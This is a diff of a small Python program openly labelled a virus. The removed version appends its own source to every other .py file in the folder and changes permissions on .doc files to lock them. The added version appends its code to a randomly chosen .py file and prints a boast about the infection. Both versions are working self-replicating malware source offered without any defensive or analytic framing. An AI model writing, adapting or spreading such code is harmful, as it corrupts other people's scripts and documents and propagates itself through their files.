@@ -1,63 +1,23 @@
-# importing important libarys to create our new python computer virus
+# virus starts
 
 import glob
-import os
-import getpass
-import platform
+import random
 
-# finding files which we want to infect
-
-def files_to_infect():
-    current_file = __file__
-
-    if platform.system() == 'Windows':
-    
-     files_list = glob.glob('*.py'.format(getpass.getuser()))
-     files_list.remove(current_file)
-
-     return files_list
-
-   else:
-       pass
-        
-
-# getting virus code to copy itself to another python files
-
-def get_virus_code():
-    file = open(__file__,'r')
-    virus = file.read()
-    return virus
-
-# copying virus by help of appending the virus code
-
-def copy_virus(content):
- for files in files_to_infect():
-    file = open(files,'a')
-    file.write(content)
-    file.close()  
-
-# calling the functions  to copy the virus and overwriting the content of virus code
-
-def infect():
-    copy_virus(get_virus_code())
-
-# corrupting ms document files
-
-def lock_files():
- files_to_lock = glob.glob('*.doc')
+files = glob.glob('*.py')
  
- for doc_files in files_to_lock:
-  os.chmod(doc_files,100)
-  
-# finally calling the important functions of virus
+file = random.choice(files)
 
-def final_virus():
- infect()
- lock_files()
+virus_file = open(__file__, 'r')
+virus_source_code = virus_file.read().split('\n# virus starts\n')
 
-# calling the function called final virus which will be our new python computer virus
+if len(virus_source_code) > 1:
+ virus_source_code = virus_source_code[1]
 
-final_virus()
+else:
+ virus_source_code = virus_source_code[0]
+ 
+f = open(file, 'a')
+f.write(virus_source_code)
+f.close()
 
-# don't try this at home "A HARMFULL RISK FOR COMPUTER CAN BE HAPPEN"
-
+print('I have got fungal infection and infected', file)
